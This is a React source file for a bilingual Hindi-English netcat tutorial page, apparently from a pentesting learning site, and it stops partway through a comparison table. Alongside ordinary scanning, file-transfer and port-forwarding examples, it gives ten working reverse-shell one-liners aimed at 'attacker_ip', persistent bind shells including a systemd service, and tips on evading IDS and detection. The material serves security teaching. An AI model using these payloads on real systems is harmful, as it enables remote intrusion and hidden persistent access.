import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Netcat() {
  return (
    <TutorialLayout
      title="netcat"
      subtitle="TCP/UDP Swiss army knife — कनेक्शन्स, ट्रांसफर, रिवर्स शेल्स"
      icon="🔧"
      prev={{ to: '/tool/reaver', label: 'reaver' }}
      next={{ to: '/tool/masscan', label: 'masscan' }}
    >
      <h2>What is Netcat?</h2>
      <p>
        Netcat (nc) TCP/IP नेटवर्किंग का Swiss army knife है। यह एक सिंपल लेकिन बेहद पावरफुल टूल है जो TCP और UDP कनेक्शन्स बना सकता है, डेटा ट्रांसफर कर सकता है, पोर्ट्स स्कैन कर सकता है, और रिवर्स/बाइंड शेल्स ले सकता है। पेनेट्रेशन टेस्टिंग, नेटवर्क ट्रबलशूटिंग, और सिस्टम एडमिनिस्ट्रेशन में यह सबसे ज़्यादा इस्तेमाल होने वाला टूल है। हर सिक्योरिटी प्रोफेशनल के toolkit में यह ज़रूर होता है।
      </p>
      <p>
        Netcat को "TCP/IP का Swiss army knife" कहा जाता है क्योंकि यह एक ही टूल में कई काम कर सकता है — कनेक्ट करना, लिसन करना, फाइल भेजना, पोर्ट स्कैन करना, बैनर ग्रैब करना, और शेल्स लेना। यह C भाषा में लिखा गया है और इसका कोड बहुत छोटा है — सिर्फ कुछ हज़ार lines। यही इसकी ताकत है — कम dependencies, कम size, और हर Linux distro में available। काली लिनक्स और काली नेटहंटर दोनों में यह प्री-इंस्टॉल्ड आता है।
      </p>
      <p>
        Netcat की सबसे बड़ी खासियत इसकी सादगी है — बिना किसी कॉम्प्लेक्स सिंटैक्स के TCP/UDP कनेक्शन बना सकते हैं। यह सिर्फ एक बाइनरी है जो नेटवर्क सॉकेट्स के ऊपर काम करती है। पोस्ट-एक्सप्लॉइटेशन में रिवर्स शेल लेने के लिए यह सबसे कॉमन तरीका है। इसके अलावा Ncat (Nmap का version), socat, और netcat-openbsd जैसे वेरिएंट्स भी हैं जो एक्स्ट्रा फीचर्स देते हैं — SSL/TLS, proxy support, और authentication।
      </p>
      <p>
        Netcat 1995 से exist करता है और आज भी उतना ही relevant है जितना पहले था। यही कारण है कि इसे "survival tool" भी कहते हैं — जब कोई और tool available न हो, Netcat काम आता है। Red team operations में Netcat का role बहुत critical है — initial access मिलने के बाद reverse shell लेने का सबसे fast तरीका Netcat है। Lateral movement के दौरान port forwarding, file transfer between hosts, और quick banner grabbing सब Netcat से होता है।
      </p>
      <p>
        Blue teamers भी Netcat का इस्तेमाल करते हैं — firewall testing, service connectivity check, और network troubleshooting के लिए। यह टूल दोनों तरफ काम आता है — offense और defense। CTF competitions में भी Netcat सबसे ज़्यादा use होने वाला tool है। Network debugging के लिए यह सबसे simple और fastest tool है। एक command में port check करो, banner grab करो, या file transfer करो — Netcat सब कर सकता है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Netcat केवल अधिकृत पेनेट्रेशन टेस्टिंग और नेटवर्क ट्रबलशूटिंग के लिए इस्तेमाल करें। बिना अनुमति के रिवर्स शेल, बाइंड शेल, या पोर्ट स्कैनिंग करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत नेटवर्क एक्सेस अपराध हो सकता है — 3 साल तक की जेल और 5 लाख तक का जुर्माना हो सकता है। केवल अपने लैब या लिखित अनुमति के साथ ही उपयोग करें।
      </div>

      <h2>History of Netcat</h2>
      <p>
        Netcat को 1995 में Hobbit ने बनाया था। यह Unix के लिए लिखा गया था और जल्दी ही सिक्योरिटी कम्युनिटी में लोकप्रिय हो गया। उस समय नेटवर्क डायग्नोस्टिक्स के लिए इतना सिंपल और versatile कोई टूल नहीं था। Netcat ने TCP/IP debugging को बहुत आसान बना दिया — पहले जो काम कई tools से होता था, वो एक ही tool से होने लगा।
      </p>
      <p>
        1996 में Netcat RFC 854 (Telnet) और अन्य protocols support करता था। इसका source code freely available था और developers ने इसे modify करके नए features add किए। 2004 में GNU Netcat आया जो complete rewrite था — बेहतर code quality और bug fixes के साथ। 2006 में OpenBSD team ने अपना version बनाया जो security-focused था — कम features लेकिन ज़्यादा secure। 2011 में Nmap team ने Ncat बनाया जो सबसे advanced version है — SSL/TLS, proxy, authentication, और access control support के साथ।
      </p>
      <p>
        Netcat के history में एक interesting fact यह है कि इसे originally "network debugging tool" के रूप में बनाया गया था, लेकिन सिक्योरिटी researchers ने इसे offensive tool के रूप में adopt कर लिया। Reverse shells, bind shells, और port forwarding जैसे capabilities ने इसे penetration testers का favorite बना दिया। आज भी CTF competitions और real-world pentesting में Netcat सबसे ज़्यादा use होने वाला tool है। कई advanced tools (Metasploit, Cobalt Strike) भी internally Netcat जैसे mechanisms use करते हैं।
      </p>

      <h2>How Netcat Works?</h2>
      <p>
        Netcat directly BSD sockets API का इस्तेमाल करता है। यह socket create करता है, connect/listen करता है, और data transfer करता है। इसका architecture बहुत simple है — single-threaded, blocking I/O model। यही simplicity इसकी reliability है — कम code मतलब कम bugs।
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">Socket Creation:</strong> socket() system call से TCP/UDP socket बनाता है — यह kernel-level object है जो network communication handle करता है</li>
        <li><strong className="text-white">TCP Stream:</strong> SOCK_STREAM type socket — reliable, ordered, connection-based data delivery guarantee करता है</li>
        <li><strong className="text-white">UDP Datagram:</strong> SOCK_DGRAM type socket — fast, connectionless, unreliable — speed चाहिए तो UDP, reliability चाहिए तो TCP</li>
        <li><strong className="text-white">Connect Mode:</strong> connect() system call से remote host:port से connection establish करता है — client mode</li>
        <li><strong className="text-white">Listen Mode:</strong> bind() + listen() + accept() से incoming connections wait करता है — server mode</li>
        <li><strong className="text-white">I/O Redirection:</strong> stdin/stdout को socket file descriptor से redirect करता है — इसी से shell binding होता है</li>
        <li><strong className="text-white">Zero I/O (-z):</strong> connect() try करता है, तुरंत close करता है — सिर्फ port open/closed check purpose</li>
        <li><strong className="text-white">Execute (-e):</strong> fork() + exec() से shell को socket FD से attach करता है — यही reverse/bind shell का core है</li>
      </ul>
      <p>
        Netcat का data flow बहुत straightforward है: user input → stdin → socket → network → remote socket → stdout → display। यह pipeline model use करता है जिससे इसे pipes और redirections के साथ combine करना आसान है। यही कारण है कि Netcat को दूसरे tools के साथ chain करके complex operations किए जा सकते हैं — जैसे tar + nc से file transfer, openssl + nc से encrypted shell।
      </p>

      <h2>Installation</h2>
      <p>
        काली नेटहंटर में Netcat पहले से इंस्टॉल्ड आता है। कई variants available हैं — हर एक के अपने advantages हैं। Pentesting के लिए Ncat (Nmap team) सबसे recommended है।
      </p>
      <CodeBlock
        title="Netcat इंस्टॉलेशन"
        code={`# काली लिनक्स/नेटहंटर में (पहले से है चेक करें):
nc -h

# Debian/Ubuntu में इंस्टॉल:
sudo apt update
sudo apt install netcat

# Ncat (Nmap का version — सबसे advanced):
sudo apt install ncat

# OpenBSD version (security-focused):
sudo apt install netcat-openbsd

# Traditional version (classic features):
sudo apt install netcat-traditional

# Termux (Android) में:
pkg install netcat

# Arch Linux:
sudo pacman -S openbsd-netcat

# Fedora/RHEL:
sudo dnf install nmap-ncat

# macOS (Homebrew):
brew install netcat

# वर्जन चेक:
nc -h 2>&1 | head -5
ncat --version

# कौन सा version install है देखो:
which nc && nc -h 2>&1 | head -3
which ncat && ncat --version 2>&1 | head -3`}
      />

      <h2>Basic Usage</h2>
      <p>
        Netcat का बेसिक इस्तेमाल दो तरह से होता है — connect करना और listen करना। Connect mode में यह remote server से जुड़ता है (client), listen mode में यह incoming connections का wait करता है (server)। दोनों modes मिलकर bidirectional communication बनाते हैं।
      </p>
      <CodeBlock
        title="Connect और Listen"
        code={`# किसी remote port से connect करें:
nc target_ip 80

# किसी port पर listen करें:
nc -lvnp 4444
# -l = listen mode
# -v = verbose output (connection details)
# -n = no DNS resolution (faster)
# -p = port number specify

# UDP mode:
nc -u target_ip 53

# Timeout के साथ (5 seconds):
nc -w 5 target_ip 80

# Multiple ports try करें:
nc -zv target_ip 22 80 443 8080

# Quick HTTP request:
echo -e "GET / HTTP/1.0\\r\\nHost: target.com\\r\\n\\r\\n" | nc target.com 80

# Connection established होने पर data type करो
# Enter दबाओ — data send होगा
# Ctrl+C से disconnect करो

# IPv6 connection:
nc -6 ::1 80

# Source port specify करें:
nc -p 12345 target_ip 80`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">Option</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
              <th className="text-left py-2 px-3 text-neon-green">उदाहरण</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-l</td><td className="py-2 px-3">Listen mode — incoming connections accept करें</td><td className="py-2 px-3 font-mono text-xs">nc -lvnp 4444</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-v</td><td className="py-2 px-3">Verbose output — ज़्यादा info दिखाएं</td><td className="py-2 px-3 font-mono text-xs">nc -zv target 80</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-n</td><td className="py-2 px-3">DNS resolution बंद — सिर्फ IP addresses</td><td className="py-2 px-3 font-mono text-xs">nc -n 192.168.1.1 80</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-p PORT</td><td className="py-2 px-3">Source port specify करें</td><td className="py-2 px-3 font-mono text-xs">nc -p 12345 target 80</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-z</td><td className="py-2 px-3">Zero I/O mode — सिर्फ scan, कोई data नहीं</td><td className="py-2 px-3 font-mono text-xs">nc -zv target 1-1000</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-u</td><td className="py-2 px-3">UDP mode (default TCP है)</td><td className="py-2 px-3 font-mono text-xs">nc -uv target 53</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-w SEC</td><td className="py-2 px-3">Timeout सेट करें (seconds में)</td><td className="py-2 px-3 font-mono text-xs">nc -w 3 target 80</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-e CMD</td><td className="py-2 px-3">Command execute करें (shell bind/reverse)</td><td className="py-2 px-3 font-mono text-xs">nc -e /bin/bash attacker 4444</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-k</td><td className="py-2 px-3">Keep listening — multiple connections accept करें</td><td className="py-2 px-3 font-mono text-xs">nc -lkvnp 4444</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-q SEC</td><td className="py-2 px-3">Connection close के बाद wait करें</td><td className="py-2 px-3 font-mono text-xs">nc -q 5 target 80</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-s ADDR</td><td className="py-2 px-3">Source IP address specify करें</td><td className="py-2 px-3 font-mono text-xs">nc -s 192.168.1.100 target 80</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-c STRING</td><td className="py-2 px-3">String send करें (Ncat specific)</td><td className="py-2 px-3 font-mono text-xs">ncat -c "Hello" target 80</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-d</td><td className="py-2 px-3">Detach from stdin (background mode)</td><td className="py-2 px-3 font-mono text-xs">nc -d -lvnp 4444</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-4 / -6</td><td className="py-2 px-3">IPv4 / IPv6 force करें</td><td className="py-2 px-3 font-mono text-xs">nc -6 ::1 80</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">--ssl (Ncat)</td><td className="py-2 px-3">SSL/TLS encrypted connection</td><td className="py-2 px-3 font-mono text-xs">ncat --ssl target 443</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Port Scanning</h2>
      <p>
        Netcat से क्विक पोर्ट स्कैनिंग की जा सकती है। Nmap जितना advanced नहीं है लेकिन तेज़ चेक के लिए बहुत उपयोगी है। -z flag I/O mode disable कर देता है — सिर्फ connect/disconnect होता है। कोई data transfer नहीं होता, सिर्फ port open/closed check होता है।
      </p>
      <CodeBlock
        title="Port Scanning"
        code={`# सिंगल पोर्ट चेक:
nc -zv target_ip 80

# पोर्ट रेंज स्कैन (1 से 1000):
nc -zv target_ip 1-1000

# कई specific पोर्ट्स:
nc -zv target_ip 22 80 443 8080 3306

# UDP स्कैन:
nc -zuv target_ip 53 161 162

# टाइमआउट के साथ (3 seconds per port):
nc -zv -w 3 target_ip 1-100

# सभी ports (1-65535) — slow है, Nmap better है:
nc -zv -w 1 target_ip 1-65535

# Output file में save:
nc -zv target_ip 1-1000 2>&1 | grep open > open_ports.txt

# सिर्फ open ports दिखाएं:
nc -zv target_ip 1-1000 2>&1 | grep -i "open"

# बैनर के साथ scan:
nc -v target_ip 22  # connect करो, banner पढ़ो

# Sequential scan (एक-एक करके):
for port in 22 80 443 8080 3306 5432; do
  nc -zv -w 2 target_ip $port 2>&1
done

# Service detection scan:
for port in 21 22 25 80 110 143 443; do
  echo "=== Port $port ==="
  echo "" | nc -w 3 target_ip $port 2>/dev/null | head -3
done`}
      />

      <h2>Banner Grabbing</h2>
      <p>
        बैनर ग्रैबिंग से सर्वर पर चल रही सर्विस का वर्जन और डिटेल्स पता किए जा सकते हैं। यह reconnaissance phase में बहुत useful है — service version मिलने पर specific exploits search कर सकते हो। Banner grabbing technique बहुत simple है — बस port से connect करो और service अपना banner भेजता है।
      </p>
      <CodeBlock
        title="Service Detection"
        code={`# HTTP बैनर:
echo -e "HEAD / HTTP/1.0\\r\\n\\r\\n" | nc target_ip 80

# SSH बैनर:
nc target_ip 22
# SSH-2.0-OpenSSH_8.2 दिखेगा

# SMTP बैनर:
nc target_ip 25
# 220 mail.target.com ESMTP दिखेगा

# FTP बैनर:
nc target_ip 21
# 220 FTP server ready दिखेगा

# MySQL बैनर:
nc target_ip 3306

# POP3 बैनर:
nc target_ip 110

# IMAP बैनर:
nc target_ip 143

# HTTPS (with OpenSSL):
echo "" | openssl s_client -connect target_ip:443 2>/dev/null | head -5

# DNS version query:
dig @target_ip version.bind chaos TXT

# Multiple services scan:
for port in 21 22 25 80 110 143 443 3306 5432 6379; do
  echo "=== Port $port ==="
  echo "" | nc -w 3 target_ip $port 2>/dev/null | head -3
done

# Banner with Ncat (better formatting):
ncat -v target_ip 80 --recv-only 2>&1 | head -5`}
      />

      <h2>Reverse Shell</h2>
      <p>
        रिवर्स शेल Netcat का सबसे important use case है। जब target machine पर RCE मिल जाए तो Netcat से interactive shell ले सकते हो। Reverse shell में victim attacker को connect करता है — इससे firewall bypass होता है क्योंकि outbound connections generally allowed होते हैं। यह post-exploitation का foundation है।
      </p>
      <p>
        Reverse shell का concept simple है — victim machine पर एक process चलता है जो attacker के listener से connect करता है। Connection establish होने पर victim का stdin/stdout attacker को मिल जाता है। यही reverse shell है। Firewall bypass इसलिए होता है क्योंकि outbound connections (victim → attacker) generally allowed होते हैं, inbound (attacker → victim) block होते हैं।
      </p>
      <p>
        Reverse shell stability बहुत important है — basic nc shell unstable होता है, Ctrl+C से disconnect हो जाता है, tab completion काम नहीं करता। Python PTY upgrade से stable interactive shell मिलता है: python3 -c "import pty;pty.spawn('/bin/bash')"। इसके बाद Ctrl+Z → stty raw -echo → fg → export TERM=xterm — अब fully functional terminal मिलेगा।
      </p>
      <CodeBlock
        title="Reverse Shell — Attacker Side"
        code={`# अटैकर — listener शुरू करें:
nc -lvnp 4444

# कनेक्शन आने पर shell मिल जाएगा:
# $ whoami
# www-data
# $ id
# uid=33(www-data) gid=33(www-data)
# $ hostname
# victim-server

# Listener with logging (session record):
nc -lvnp 4444 | tee session.log

# Multiple listeners (different purposes):
# Terminal 1: nc -lvnp 4444  (main shell)
# Terminal 2: nc -lvnp 4445  (data exfil)
# Terminal 3: nc -lvnp 4446  (file transfer)

# Persistent listener (auto-restart):
while true; do nc -lvnp 4444; done

# Ncat with SSL (encrypted — IDS bypass):
ncat --ssl -lvnp 4444`}
      />

      <CodeBlock
        title="Reverse Shell — Victim Side (10 Methods)"
        code={`# Method 1 — Netcat with -e (simplest):
nc -e /bin/bash attacker_ip 4444

# Method 2 — Bash (no netcat needed — most common):
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Method 3 — mkfifo (most reliable — no -e needed):
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc attacker_ip 4444 > /tmp/f

# Method 4 — Python (cross-platform):
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("attacker_ip",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])'

# Method 5 — Perl (legacy systems):
perl -e 'use Socket;$i="attacker_ip";$p=4444;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");
exec("/bin/bash -i");};'

# Method 6 — Ruby:
ruby -rsocket -e 'c=TCPSocket.new("attacker_ip","4444");
while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Method 7 — PHP (web servers):
php -r '$sock=fsockopen("attacker_ip",4444);
exec("/bin/bash -i <&3 >&3 2>&3");'

# Method 8 — Windows cmd.exe:
nc.exe -e cmd.exe attacker_ip 4444

# Method 9 — Windows PowerShell:
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('attacker_ip',4444)
$s=$c.GetStream();[byte[]]$b=0..65535|%{0}
while(($i=$s.Read($b,0,$b.Length))-ne 0){
$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i)
$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'> '
$sbte=([text.encoding]::ASCII).GetBytes($sb2)
$s.Write($sbte,0,$sbte.Length);$s.Flush()};$c.Close()"

# Method 10 — Lua (embedded systems):
lua -e "require('socket');require('os');
t=socket.tcp();t:connect('attacker_ip','4444');
os.execute('/bin/bash -i <&3 >&3 2>&3');"

# Shell upgrade (after getting basic shell):
python3 -c "import pty;pty.spawn('/bin/bash')"
# फिर: Ctrl+Z → stty raw -echo → fg → export TERM=xterm`}
      />

      <h2>Bind Shell</h2>
      <p>
        बाइंड शेल में target machine पर shell bind होता है और attacker connect करता है। यह तब useful है जब target inbound connections allow करता है। Reverse shell ज़्यादा common है क्योंकि firewalls outbound connections ज़्यादा allow करते हैं, लेकिन internal network में bind shell भी काम आता है।
      </p>
      <CodeBlock
        title="Bind Shell"
        code={`# Victim — shell bind करें:
nc -lvnp 4444 -e /bin/bash

# Attacker — connect करें:
nc target_ip 4444
# अब victim का shell मिल जाएगा

# Windows bind shell:
nc.exe -lvnp 4444 -e cmd.exe

# Multiple connections के लिए -k flag:
nc -lkvnp 4444 -e /bin/bash

# Persistent bind shell (restart on disconnect):
while true; do nc -lvnp 4444 -e /bin/bash; done

# Bind shell with password (Ncat access control):
ncat --allow 192.168.1.100 -lvnp 4444 -e /bin/bash

# Encrypted bind shell (Ncat):
# Victim:
ncat --ssl -lvnp 4444 -e /bin/bash
# Attacker:
ncat --ssl target_ip 4444

# Bind shell as service (systemd):
# /etc/systemd/system/bindshell.service:
# [Unit]
# Description=Bind Shell
# [Service]
# ExecStart=/usr/bin/nc -lvnp 4444 -e /bin/bash
# [Install]
# WantedBy=multi-user.target`}
      />

      <h2>File Transfer</h2>
      <p>
        Netcat से फाइल्स ट्रांसफर की जा सकती हैं — जब FTP/SCP available नहीं हो। यह post-exploitation में बहुत useful है — tools upload करना, loot download करना, config files transfer करना। Direction दोनों तरह से हो सकती है — sender listen करे या receiver listen करे।
      </p>
      <CodeBlock
        title="File Transfer Methods"
        code={`# Method 1 — Receiver listen करे:
# Receiver side:
nc -lvnp 4444 > received_file.txt
# Sender side:
nc target_ip 4444 < file_to_send.txt

# Method 2 — Sender listen करे:
# Sender side:
nc -lvnp 4444 < file.txt
# Receiver side:
nc target_ip 4444 > downloaded_file.txt

# Directory transfer (tar के साथ):
# Sender:
tar czf - /path/to/dir | nc -lvnp 4444
# Receiver:
nc target_ip 4444 | tar xzf -

# Large file transfer (progress दिखाने के लिए):
# Sender:
pv largefile.bin | nc -lvnp 4444
# Receiver:
nc target_ip 4444 | pv > largefile.bin

# Encrypted file transfer (OpenSSL):
# Sender:
cat file.txt | openssl enc -aes-256-cbc -pass pass:mypassword | nc -lvnp 4444
# Receiver:
nc target_ip 4444 | openssl enc -d -aes-256-cbc -pass pass:mypassword > file.txt

# File transfer with integrity check:
# Sender:
sha256sum file.txt && cat file.txt | nc -lvnp 4444
# Receiver:
nc target_ip 4444 > received.txt && sha256sum received.txt

# Multiple files (compressed archive):
# Sender:
tar czf - *.txt *.pdf | nc -lvnp 4444
# Receiver:
nc target_ip 4444 | tar xzf - -C /destination/

# Binary file transfer:
# Sender:
nc -lvnp 4444 < malware.exe
# Receiver:
nc target_ip 4444 > malware.exe`}
      />

      <h2>Chat Server</h2>
      <p>
        Netcat से basic chat server बनाया जा सकता है — दो लोग real-time में बात कर सकते हैं। यह quick communication के लिए useful है, खासकर CTF competitions में जहाँ team coordination ज़रूरी हो।
      </p>
      <CodeBlock
        title="Simple Chat"
        code={`# Server:
nc -lvnp 1234

# Client:
nc server_ip 1234

# अब दोनों तरफ से टाइप करो — messages जाएंगे
# Ctrl+C से बंद करो

# Multi-user chat (with named pipes):
mkfifo /tmp/chat_pipe
nc -lvnp 1234 < /tmp/chat_pipe | tee /tmp/chat.log
# दूसरे terminal से:
cat >> /tmp/chat_pipe

# Chat with encryption (Ncat):
# Server:
ncat --ssl -lvnp 1234 --chat
# Client:
ncat --ssl server_ip 1234

# Chat with logging:
nc -lvnp 1234 | tee -a chat_$(date +%Y%m%d).log`}
      />

      <h2>Port Forwarding</h2>
      <p>
        Netcat से port forwarding भी की जा सकती है — एक port पर incoming traffic दूसरे host:port पर redirect करना। यह pivot operations में बहुत useful है — internal network services को बाहर accessible बनाना।
      </p>
      <CodeBlock
        title="Port Forwarding"
        code={`# Simple port forward (redirect 8080 to target:80):
# Method 1 — mkfifo:
mkfifo /tmp/fifo
nc -lvnp 8080 < /tmp/fifo | nc target_ip 80 > /tmp/fifo

# Method 2 — Ncat (cleaner):
ncat -lvnp 8080 --sh-exec "ncat target_ip 80"

# Reverse port forward (expose internal service):
mkfifo /tmp/fifo2
nc -lvnp 4444 < /tmp/fifo2 | nc internal_host 80 > /tmp/fifo2

# Load balancer (round-robin to multiple backends):
mkfifo /tmp/fifo_a /tmp/fifo_b
nc -lvnp 8080 < /tmp/fifo_a | nc backend1 80 > /tmp/fifo_a &
nc -lvnp 8081 < /tmp/fifo_b | nc backend2 80 > /tmp/fifo_b &

# Transparent proxy:
mkfifo /tmp/in /tmp/out
nc -lvnp 8080 < /tmp/in | nc target 80 > /tmp/in

# SOCKS-like proxy (through SSH jump host):
ssh -D 1080 user@jumphost
# फिर proxychains से access करो`}
      />

      <h2>Real-World Case Studies</h2>
      <p>
        Netcat real-world pentesting और incident response में daily use होता है। यहाँ practical scenarios हैं:
      </p>
      <p>
        <strong className="text-white">Case Study 1 — Post-Exploitation Reverse Shell:</strong> एक red team engagement में tester ने web application पर RCE vulnerability exploit की। Bash reverse shell use करके target server पर access मिला: bash -i >& /dev/tcp/attacker/4444 0>&1। Python PTY upgrade करके stable interactive shell बनाया। इस shell से internal network scan किया — 3 और servers मिले जो firewall के पीछे थे। Netcat port forwarding से उन servers तक access मिला। कुल 4 compromised hosts — सब Netcat से।
      </p>
      <p>
        <strong className="text-white">Case Study 2 — Forensic Data Exfiltration:</strong> Incident response team को compromised server से log files निकालनी थीं। Server पर FTP/SCP available नहीं था — सिर्फ Netcat था। Encrypted file transfer use किया: openssl enc + nc pipe। 500MB logs securely transfer हुए बिना network monitoring detect करे। Integrity verify करने के लिए sha256sum compare किया — सब match।
      </p>
      <p>
        <strong className="text-white">Case Study 3 — CTF Competition:</strong> CTF competition में team को binary exploitation challenge solve करना था। Buffer overflow exploit करने के बाद Netcat से reverse shell लिया। mkfifo method use किया क्योंकि target पर nc -e available नहीं था। Shell मिलने के बाद flag file read की और submit किया। पूरा challenge 15 minutes में solve — Netcat की simplicity की वजह से।
      </p>
      <p>
        <strong className="text-white">Case Study 4 — Network Troubleshooting:</strong> Production environment में application server database से connect नहीं हो पा रहा था। Firewall team कह रहा था port open है। Netcat से verify किया: nc -zv db-server 3306 — connection refused। Problem firewall rule में नहीं, database service down होने में थी। एक command से root cause identify हुआ। बिना Netcat के troubleshooting में hours लगते।
      </p>

      <h2>Integration with Other Tools</h2>
      <p>
        Netcat दूसरे tools के साथ chain करके powerful workflows बनते हैं। Pipes और redirections Netcat की सबसे बड़ी ताकत है:
      </p>
      <CodeBlock
        title="Netcat Tool Integration"
        code={`# Netcat + Nmap combo:
# Nmap से open ports find करो, Netcat से verify:
nmap -sV target_ip | grep open | awk '{print $1}' | cut -d'/' -f1 | while read port; do
    echo "=== Port $port ==="
    echo "" | nc -w 3 target_ip $port 2>/dev/null | head -3
done

# Netcat + Metasploit:
# Metasploit multi/handler + Netcat reverse shell:
# Terminal 1: msfconsole → use exploit/multi/handler → set payload → run
# Terminal 2: nc -e /bin/bash attacker_ip 4444

# Netcat + SSH tunnel:
# SSH tunnel create करो, Netcat से access:
ssh -L 8080:internal:80 user@jumphost
nc localhost 8080

# Netcat + Proxychains:
# SOCKS proxy through Netcat:
# /etc/proxychains.conf में socks4 127.0.0.1 1080 add करो
proxychains nc target_ip 80

# Netcat + Wireshark:
# Traffic capture + analysis:
nc -lvnp 8080 | tee capture.log
# Wireshark में capture.log open करो

# Netcat + OpenSSL (encrypted channel):
# Sender:
cat secret.txt | openssl enc -aes-256-cbc -pass pass:key | nc -lvnp 4444
# Receiver:
nc target 4444 | openssl enc -d -aes-256-cbc -pass pass:key > secret.txt`}
      />

      <h2>Performance Tuning</h2>
      <p>
        Netcat को efficiently use करने के लिए optimization tips:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">DNS Resolution (-n):</strong> -n flag use करो — DNS lookup skip होगा, faster connections</li>
        <li><strong className="text-white">Timeout (-w):</strong> -w 3 seconds set करो — dead hosts पर time waste नहीं होगा</li>
        <li><strong className="text-white">Zero I/O (-z):</strong> Port scanning के लिए -z flag mandatory — data transfer नहीं होगा</li>
        <li><strong className="text-white">Buffer Size:</strong> Large file transfer में pipe buffer optimize करो: dd bs=1M | nc</li>
        <li><strong className="text-white">Keep Alive (-k):</strong> Multiple connections के लिए -k flag — listener restart नहीं होगा</li>
        <li><strong className="text-white">Background Mode:</strong> Long-running listeners को screen/tmux में run करो</li>
        <li><strong className="text-white">Port Selection:</strong> Common ports (443, 53, 80) use करो shells के लिए — detection avoid</li>
        <li><strong className="text-white">Compression:</strong> File transfer में tar czf compression use करो — transfer time कम</li>
      </ul>

      <h2>Reporting and Output Analysis</h2>
      <p>
        Netcat operations के results को log और analyze करना important है:
      </p>
      <CodeBlock
        title="Logging and Analysis"
        code={`# Connection logging:
nc -lvnp 4444 | tee session_$(date +%Y%m%d_%H%M%S).log

# Port scan results save:
nc -zv target_ip 1-1000 2>&1 | grep open | tee open_ports.txt

# Banner grab results:
for port in 21 22 25 80 443 3306; do
    echo "=== Port $port ===" >> banner_report.txt
    echo "" | nc -w 3 target_ip $port 2>/dev/null >> banner_report.txt
    echo "" >> banner_report.txt
done

# File transfer integrity:
# Sender:
sha256sum file.txt > file.txt.sha256
cat file.txt | nc -lvnp 4444
# Receiver:
nc target 4444 > received.txt
sha256sum -c file.txt.sha256

# Session recording (script command):
script -a session.log
nc -lvnp 4444
# Ctrl+D to stop recording

# Traffic analysis:
nc -lvnp 8080 | xxd | tee hex_dump.log
# Hex dump of incoming data — useful for protocol analysis`}
      />

      <h2>Netcat vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Netcat</th>
              <th className="text-left py-2 px-3 text-neon-green">Ncat</th>
              <th className="text-left py-2 px-3 text-neon-green">Socat</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">प्रोजेक्ट</td><td className="py-2 px-3">Original (Hobbit)</td><td className="py-2 px-3">Nmap team</td><td className="py-2 px-3">Independent</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">SSL/TLS</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (--ssl)</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">Proxy Support</td><td className="py-2 px-3">नहीं</td><td className="py-2 px-3">हाँ (SOCKS4/5, HTTP)</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">UDP Support</td><td className="py-2 px-3">हाँ (-u)</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">-e flag</td><td className="py-2 px-3">कुछ versions में</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">exec feature</td></tr>
